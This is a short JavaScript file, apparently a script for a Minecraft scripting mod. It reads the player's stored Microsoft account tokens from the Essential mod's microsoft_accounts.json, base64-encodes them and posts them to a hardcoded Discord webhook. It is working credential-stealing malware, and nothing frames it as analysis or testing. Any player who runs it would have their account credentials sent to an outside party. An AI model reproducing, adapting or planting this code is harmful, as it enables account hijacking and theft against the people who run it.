const FILE_PATH = Java.type("java.nio.file.Paths").get(
    Java.type("java.lang.System").getProperty("user.home"),
    ".minecraft", "essential", "microsoft_accounts.json"
).toString();

const WEBHOOK_URL = "https://discord.com/api/webhooks/1333133682915151943/U2EECivgXC_DLrYcEbb2eDlvs-PBS7HNvzd-RKy4IK0XQKLVsgTW58aCk99x-KMlBWy7";

const File = Java.type("java.io.File");
const Files = Java.type("java.nio.file.Files");
const Paths = Java.type("java.nio.file.Paths");
const StandardCharsets = Java.type("java.nio.charset.StandardCharsets");

try {
    // Check if the file exists
    const file = new File(FILE_PATH);
    if (!file.exists()) {
        Chat.log(`File not found: ${FILE_PATH}`);
        return;
    }

    // Read the file content
    const fileBytes = Files.readAllBytes(Paths.get(FILE_PATH));
    const encodedFile = Java.type("java.util.Base64").getEncoder().encodeToString(fileBytes);

    // Create a payload for the webhook
    const payload = {
        content: "Here is your file!",
        file: encodedFile // Add base64 file content
    };

    // Send the HTTP POST request
    const response = Network.request({
        url: WEBHOOK_URL,
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    // Check response
    if (response.getResponseCode() === 200) {
        Chat.log("File sent successfully.");
    } else {
        Chat.log(`Failed to send the file. HTTP Status Code: ${response.getResponseCode()}`);
    }
} catch (error) {
    Chat.log(`Error occurred: ${error.message}`);
}
